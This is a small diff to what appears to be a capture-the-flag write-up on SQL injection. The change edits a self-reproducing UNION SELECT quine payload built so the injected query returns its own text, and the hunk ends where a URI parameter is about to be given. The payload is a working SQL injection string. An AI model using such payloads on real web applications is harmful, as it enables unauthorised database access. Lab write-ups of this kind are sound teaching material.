@@ -208,7 +208,7 @@ Now, we have to implement this for the challenge.
 We will have to modify this Quine to the following:
 
 ```sql
-UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -
+\' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -',char(34),char( 39)),char(36),'" UNION SELECT Replace(Replace("$",char(34),char(39)),char(36),"$") -- -') -- -
 ```
 
 If we provide the following URI parameter:
